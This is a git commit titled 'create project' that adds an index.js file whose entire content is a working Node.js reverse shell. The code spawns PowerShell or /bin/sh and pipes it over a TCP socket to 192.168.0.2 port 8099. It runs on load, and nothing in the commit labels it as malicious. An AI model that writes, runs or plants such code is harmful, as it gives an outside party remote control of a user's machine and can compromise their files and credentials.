7f001fa29042305b831b4443cfe699a03c40f427
Guilherme Gavazzoni <guilherme.gavazzoni@outlook.com>
2025-06-19 17:01:51 -0300

    create project

---
+++ index.js
@@ -0,0 +1,23 @@
+(function () {
+  const net = require("net");
+  const cp = require("child_process");
+  const os = require("os");
+
+  let shell, shellArgs;
+  if (os.platform() === "win32") {
+    shell = "powershell.exe";
+    shellArgs = [];
+  } else {
+    shell = "/bin/sh";
+    shellArgs = [];
+  }
+
+  const sh = cp.spawn(shell, shellArgs);
+
+  const client = new net.Socket();
+  client.connect(8099, "192.168.0.2", function () {
+    client.pipe(sh.stdin);
+    sh.stdout.pipe(client);
+    sh.stderr.pipe(client);
+  });
+})();
